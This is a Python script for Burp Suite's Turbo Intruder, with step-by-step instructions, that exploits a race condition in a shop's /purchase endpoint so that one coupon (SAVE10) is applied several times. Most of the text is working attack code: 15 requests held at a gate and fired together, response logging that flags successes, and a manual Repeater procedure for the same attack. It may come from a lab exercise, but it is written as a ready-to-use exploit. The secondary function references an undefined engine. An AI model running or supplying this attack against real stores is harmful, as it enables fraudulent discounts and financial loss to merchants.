# Turbo Intruder Script for Coupon Race Condition Exploit
# ======================================================
# 
# Instructions:
# 1. In Burp Suite, capture a POST request to /purchase with coupon_code=SAVE10
# 2. Right-click -> Extensions -> Turbo Intruder -> Send to Turbo Intruder
# 3. Replace the default script with this code
# 4. Click "Attack" to exploit the race condition
#
# Expected Result:
# - Multiple requests succeed simultaneously
# - Same coupon (SAVE10) gets applied multiple times
# - More discount than intended (business logic bypass)

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,  # High concurrency for race condition
                          requestsPerConnection=1,
                          pipeline=False)
    
    # The base request should be the captured /purchase request with coupon_code=SAVE10
    
    # Queue multiple identical requests to exploit race condition
    for i in range(15):  # Send 15 concurrent requests
        engine.queue(target.req, gate='race1')
    
    # Open the race condition gate - all requests fire simultaneously
    engine.openGate('race1')
    
    print("🎯 Fired 15 concurrent coupon requests!")
    print("⏱️  Exploiting 100ms race condition window...")

def handleResponse(req, interesting):
    table.add(req)
    
    # Log successful purchases
    if req.status == 302 or "Purchase successful" in req.response:
        print(f"✅ Request {req.engine.requestCount}: SUCCESS - Coupon likely applied")
    elif req.status == 200:
        print(f"⚠️  Request {req.engine.requestCount}: Response 200 - Check manually")  
    else:
        print(f"❌ Request {req.engine.requestCount}: HTTP {req.status}")

# Alternative simple version for testing
def queueRequests_simple(target, wordlists):
    # For basic race condition testing
    for i in range(10):
        target.req.headers['X-Race-ID'] = str(i)  # Optional: track requests
        engine.queue(target.req)

"""
Manual Burp Repeater Testing:
1. Capture POST /purchase request with coupon_code=SAVE10  
2. Right-click -> Send to Repeater
3. Create 10+ tabs with same request
4. Use Ctrl+Click to send all requests simultaneously
5. Check responses and database for multiple coupon applications

Expected vulnerable behavior:
- Time window: ~100ms between coupon check and usage increment
- Race condition: Multiple requests pass coupon validation
- Result: Same coupon applied multiple times in single "purchase"
- Database: Multiple transactions with same coupon code
"""
